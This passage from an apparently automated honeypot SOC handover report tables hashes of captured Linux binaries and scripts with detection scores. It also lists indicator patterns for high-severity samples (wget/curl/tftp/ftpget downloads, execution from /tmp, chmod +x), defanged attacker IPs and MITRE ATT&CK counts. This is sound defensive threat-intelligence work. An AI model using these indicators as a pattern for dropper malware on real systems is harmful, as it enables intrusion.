| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `219.250.145[.]12` | KR | SK Broadband Co Ltd | **100** ⚠️ | 1 |
| `66.132.195[.]82` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `79.11.39[.]204` | IT | Telecom Italia S.p.A. | **100** ⚠️ | 6 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `134.209.229[.]23` | DE | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `8.219.220[.]7` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 0 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 56 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 46 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 13 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 13 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 12 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 4 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 116 cases |
| Tool 34  | Credential Extractor        | ✅ 54 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 30 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (8.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 18 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 46 priority case(s) shown individually · 14 recon entry/entries in table (7 group(s) consolidating 53 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-26T03:09:29Z_
